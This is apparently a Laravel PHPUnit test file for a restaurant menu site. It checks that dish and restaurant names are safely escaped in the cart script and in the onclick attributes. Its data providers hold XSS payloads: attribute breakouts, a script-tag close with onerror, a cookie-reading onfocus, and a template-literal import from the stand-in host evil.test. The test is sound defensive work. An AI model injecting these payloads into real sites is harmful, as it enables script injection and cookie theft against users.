<?php

namespace Tests\Feature;

use App\Models\Categoria;
use App\Models\CategoriaTraduccion;
use App\Models\Horario;
use App\Models\Producto;
use App\Models\ProductoTraduccion;
use App\Models\ProductoVariante;
use App\Models\Restaurante;
use App\Models\Scopes\RestauranteScope;
use App\Models\VarianteTraduccion;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Js;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

class MenuPublicoContextoJsTest extends TestCase
{
    use RefreshDatabase;

    protected function tearDown(): void
    {
        RestauranteScope::setRestauranteId(null);
        parent::tearDown();
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function nombresHostiles(): array
    {
        return [
            'template literal' => ['Tacos ${alert(1)} `x` ${import(`//evil.test/a.js`)}', 'tacos-template'],
            'cierre de script' => ['</script><img src=x onerror=alert(1)>', 'tacos-script'],
            'barra invertida final' => ['Tacos del Norte\\', 'tacos-barra'],
            'apostrofo y comillas' => ['Tony\'s "Special"', "tony's-special"],
        ];
    }

    /**
     * @return array{restaurante: Restaurante, producto: string, variante: string}
     */
    private function crearMenuPedible(string $nombre, string $slug): array
    {
        $restaurante = Restaurante::factory()->create([
            'nombre' => $nombre,
            'slug' => $slug,
            'pedidos_activos' => true,
            'whatsapp_pedidos' => '525512345678',
        ]);
        foreach (range(0, 6) as $dia) {
            Horario::factory()->create([
                'restaurante_id' => $restaurante->id,
                'dia_semana' => $dia,
                'abre' => '00:00:00',
                'cierra' => '23:59:59',
                'cerrado' => false,
            ]);
        }

        $categoria = Categoria::factory()->create(['restaurante_id' => $restaurante->id]);
        CategoriaTraduccion::factory()->create(['categoria_id' => $categoria->id, 'idioma' => 'es', 'nombre' => 'Entradas']);

        $nombreProducto = 'Plato `${x}` "q" \'a\' \\';
        $nombreVariante = 'Grande `${y}` "v" \'b\' \\';

        $simple = Producto::factory()->create([
            'restaurante_id' => $restaurante->id,
            'categoria_id' => $categoria->id,
            'disponible' => true,
            'visible' => true,
            'precio' => 50,
            'precio_oferta' => null,
        ]);
        ProductoTraduccion::factory()->create(['producto_id' => $simple->id, 'idioma' => 'es', 'nombre' => $nombreProducto]);

        $conVariante = Producto::factory()->create([
            'restaurante_id' => $restaurante->id,
            'categoria_id' => $categoria->id,
            'disponible' => true,
            'visible' => true,
        ]);
        ProductoTraduccion::factory()->create(['producto_id' => $conVariante->id, 'idioma' => 'es', 'nombre' => $nombreProducto]);
        $variante = ProductoVariante::factory()->create(['producto_id' => $conVariante->id, 'precio' => 80, 'disponible' => true]);
        VarianteTraduccion::factory()->create(['variante_id' => $variante->id, 'idioma' => 'es', 'nombre' => $nombreVariante]);

        return ['restaurante' => $restaurante, 'producto' => $nombreProducto, 'variante' => $nombreVariante];
    }

    private function extraerScriptDelCarrito(string $html): string
    {
        preg_match_all('#<script>(.*?)</script>#s', $html, $coincidencias);
        $bloques = array_filter($coincidencias[1], fn (string $bloque): bool => str_contains($bloque, 'CART_KEY'));

        $this->assertCount(1, $bloques, 'No se encontró exactamente un bloque de script del carrito.');

        return (string) array_values($bloques)[0];
    }

    #[DataProvider('nombresHostiles')]
    public function test_el_script_del_carrito_pasa_los_datos_como_literales_js_escapados(string $nombre, string $slug): void
    {
        $menu = $this->crearMenuPedible($nombre, $slug);

        $html = $this->get(route('menu.publico', ['slug' => $slug]))->assertOk()->getContent();
        $script = $this->extraerScriptDelCarrito($html);

        $literalNombre = Js::from($nombre)->toHtml();
        $literalSlug = Js::from('menuonl_cart_'.$slug)->toHtml();

        $this->assertStringContainsString($literalNombre, $script);
        $this->assertStringContainsString($literalSlug, $script);
        $this->assertStringContainsString(Js::from($menu['restaurante']->moneda)->toHtml(), $script);
        $this->assertStringNotContainsString('</script><img', $html);

        // Fuera de los literales generados, ningún rastro de los datos del restaurante debe quedar en el script.
        $resto = str_replace([$literalNombre, $literalSlug], '', $script);
        foreach (['alert(1)', '`x`', 'evil.test', '<img', 'Tacos', 'Tony', 'Special', 'Norte'] as $fragmento) {
            $this->assertStringNotContainsString($fragmento, $resto, "Rastro crudo de '{$fragmento}' fuera de un literal JS.");
        }
        $this->assertStringNotContainsString('{{', $script);
        $this->assertStringNotContainsString('&#039;', $script);
    }

    public function test_un_apostrofo_no_sale_como_entidad_html_dentro_del_script(): void
    {
        $this->crearMenuPedible('Tony\'s "Special"', 'tonys-special');

        $html = $this->get(route('menu.publico', ['slug' => 'tonys-special']))->assertOk()->getContent();
        $script = $this->extraerScriptDelCarrito($html);

        $this->assertStringNotContainsString('Tony&#039;s', $script);
        $this->assertStringNotContainsString('tony&#039;s', $script);
        $this->assertStringNotContainsString('Tony&quot;', $script);
        $this->assertStringContainsString(Js::from('Tony\'s "Special"')->toHtml(), $script);
        $this->assertStringContainsString('en *${NOMBRE}*', $script);
    }

    public function test_plantilla_de_mensaje_whatsapp_en_script_usa_textos_aprobados_del_lote_1(): void
    {
        $this->crearMenuPedible('El Buen Taco', 'el-buen-taco');

        $html = $this->get(route('menu.publico', ['slug' => 'el-buen-taco']))->assertOk()->getContent();
        $script = $this->extraerScriptDelCarrito($html);

        // Estructura aprobada en ecf3c15
        $this->assertStringContainsString('Hola, quiero pedir en *${NOMBRE}*:\n\n', $script);
        $this->assertStringContainsString('*Mesa:* ${mesaText}\n\n', $script);
        $this->assertStringContainsString('*Pedido:*\n${itemsText}\n', $script);
        $this->assertStringContainsString('*Nota para la cocina:* ${notasGenerales}\n\n', $script);
        $this->assertStringContainsString('*Total:* ${fmt(total)}', $script);
        $this->assertStringContainsString("mesaVal ? mesaVal : 'Para llevar'", $script);

        // Textos anteriores obsoletos no deben existir
        $this->assertStringNotContainsString('¡Hola! Quiero hacer el siguiente pedido', $script);
        $this->assertStringNotContainsString('*Ubicación/Mesa:*', $script);
        $this->assertStringNotContainsString('*Detalle del pedido:*', $script);
        $this->assertStringNotContainsString('*Indicaciones:*', $script);
        $this->assertStringNotContainsString('*Total estimado:*', $script);
        $this->assertStringNotContainsString('Para llevar / Sin mesa', $script);
    }

    public function test_los_onclick_de_agregar_al_carrito_no_se_rompen_con_nombres_hostiles(): void
    {
        $menu = $this->crearMenuPedible('Tony\'s "Special"', 'tonys-special');

        $html = $this->get(route('menu.publico', ['slug' => 'tonys-special']))->assertOk()->getContent();

        preg_match_all('/onclick="(cartAddItem\([^"]*\))"/s', $html, $coincidencias);
        $this->assertCount(2, $coincidencias[1], 'Se esperaban dos botones de agregar (simple y con variante).');

        $literalProducto = Js::from($menu['producto'])->toHtml();
        $literalVariante = Js::from($menu['variante'])->toHtml();

        foreach ($coincidencias[1] as $onclick) {
            $this->assertStringContainsString($literalProducto, $onclick);
            $this->assertStringNotContainsString('&#039;', $onclick);

            $resto = str_replace([$literalProducto, $literalVariante], '', $onclick);
            foreach (['`', '${', 'Plato', 'Grande', '\\'] as $fragmento) {
                $this->assertStringNotContainsString($fragmento, $resto, "Rastro crudo de '{$fragmento}' fuera de un literal JS.");
            }
        }

        $this->assertStringContainsString($literalVariante, implode('', $coincidencias[1]));
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function matrizAtaquesAtributosXss(): array
    {
        return [
            'escape con comillas dobles y handler onmouseover' => ['" onmouseover="alert(1)'],
            'escape de tag y script malicioso' => ['"><script>alert(1)</script><div class="'],
            'salto de linea y comillas para romper atributo' => ["Platillo \n con salto de linea y \" onfocus=\"alert(1)"],
            'separadores de linea unicode U+2028 y U+2029' => ["Unicode \u{2028} and \u{2029} test \" onclick=\"alert(1)"],
            'apostrofos comillas y script anidado' => ['Tony\'s \' "Special" <script>alert(\'xss\')</script> \\'],
            'autofocus y onfocus para ejecucion inmediata' => ['test" autofocus onfocus="alert(document.cookie)'],
        ];
    }

    /**
     * Test hostile attribute breakout XSS payload matrix on dish card buttons and onclick handlers
     * (double quotes, newlines, line separators, scripts) confirming safe escaping.
     */
    #[DataProvider('matrizAtaquesAtributosXss')]
    public function test_matriz_hostil_xss_en_onclick_y_atributos_dish_card(string $payload): void
    {
        $slug = 'xss-'.substr(md5($payload), 0, 8);
        $restaurante = Restaurante::factory()->create([
            'nombre' => 'Resto XSS Test',
            'slug' => $slug,
            'pedidos_activos' => true,
            'whatsapp_pedidos' => '525512345678',
        ]);
        foreach (range(0, 6) as $dia) {
            Horario::factory()->create([
                'restaurante_id' => $restaurante->id,
                'dia_semana' => $dia,
                'abre' => '00:00:00',
                'cierra' => '23:59:59',
                'cerrado' => false,
            ]);
        }

        $categoria = Categoria::factory()->create(['restaurante_id' => $restaurante->id]);
        CategoriaTraduccion::factory()->create(['categoria_id' => $categoria->id, 'idioma' => 'es', 'nombre' => 'Entradas']);

        // 1. Platillo simple
        $simple = Producto::factory()->create([
            'restaurante_id' => $restaurante->id,
            'categoria_id' => $categoria->id,
            'disponible' => true,
            'visible' => true,
            'precio' => 50,
        ]);
        ProductoTraduccion::factory()->create(['producto_id' => $simple->id, 'idioma' => 'es', 'nombre' => $payload]);

        // 2. Platillo con variantes
        $conVariante = Producto::factory()->create([
            'restaurante_id' => $restaurante->id,
            'categoria_id' => $categoria->id,
            'disponible' => true,
            'visible' => true,
        ]);
        ProductoTraduccion::factory()->create(['producto_id' => $conVariante->id, 'idioma' => 'es', 'nombre' => $payload]);
        $var = ProductoVariante::factory()->create(['producto_id' => $conVariante->id, 'precio' => 75, 'disponible' => true]);
        VarianteTraduccion::factory()->create(['variante_id' => $var->id, 'idioma' => 'es', 'nombre' => $payload]);

        $respuesta = $this->get(route('menu.publico', ['slug' => $slug]));
        $respuesta->assertOk();
        $html = $respuesta->getContent();

        // Verificar que ningún atributo malicioso rompió las comillas para inyectar un atributo HTML real
        $this->assertDoesNotMatchRegularExpression('/"\s+(onmouseover|onfocus|autofocus)=/i', $html, 'No debe existir inyección de manejadores de eventos o autofocus fuera de atributos entrecomillados.');
        $this->assertStringNotContainsString('onmouseover="', $html);
        $this->assertStringNotContainsString('onfocus="', $html);

        // Verificar que no existen tags <script> no autorizados
        $this->assertStringNotContainsString('<script>alert(', $html);

        // Verificar que los botones de agregar al pedido conservan su onclick intacto
        preg_match_all('/onclick="(cartAddItem\([^"]*\))"/s', $html, $coincidencias);
        $this->assertCount(2, $coincidencias[1], 'Los 2 botones deben tener atributos onclick bien cerrados sin ser partidos por comillas dobles.');

        // Verificar que el literal Js::from fue emitido y escapa comillas correctamente
        $literalJs = Js::from($payload)->toHtml();
        $this->assertStringContainsString($literalJs, $html);

        // Verificar que en atributos aria-label las comillas dobles están codificadas como entidades HTML
        if (str_contains($payload, '"')) {
            $this->assertStringNotContainsString('aria-label="Agregar '.$payload, $html);
            $this->assertStringContainsString('&quot;', $html);
        }
    }
}
